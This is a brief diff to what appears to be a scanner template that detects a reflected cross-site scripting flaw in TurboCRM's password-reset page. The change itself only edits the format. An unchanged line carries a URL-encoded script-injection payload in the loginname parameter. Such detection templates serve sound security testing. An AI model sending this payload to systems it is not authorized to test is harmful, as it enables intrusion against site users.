@@ -12,10 +12,8 @@ info:
     cvss-score: 7.2
     cwe-id: CWE-79
   tags: xss,turbocrm
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - '{{BaseURL}}/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
